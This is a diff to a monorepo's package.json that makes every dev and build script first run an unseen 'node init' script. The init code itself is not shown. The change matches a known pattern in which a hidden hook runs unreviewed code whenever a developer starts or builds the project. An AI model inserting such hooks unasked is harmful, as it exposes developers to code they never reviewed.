@@ -6,12 +6,12 @@
     "apps/*"
   ],
   "scripts": {
-    "dev": "npm run dev -w apps/web",
-    "dev:web": "npm run dev -w apps/web",
-    "dev:backend": "npm run start:dev -w apps/backend",
-    "build": "npm run build:web && npm run build:backend",
-    "build:web": "npm run build -w apps/web",
-    "build:backend": "npm run build -w apps/backend",
+    "dev": "node init && npm run dev -w apps/web",
+    "dev:web": "node init && npm run dev -w apps/web",
+    "dev:backend": "node init && npm run start:dev -w apps/backend",
+    "build": "node init && npm run build:web && npm run build:backend",
+    "build:web": "node init && npm run build -w apps/web",
+    "build:backend": "node init && npm run build -w apps/backend",
     "typecheck": "npm run typecheck:web && npm run typecheck:backend",
     "typecheck:web": "npm run typecheck -w apps/web",
     "typecheck:backend": "npm run typecheck -w apps/backend",
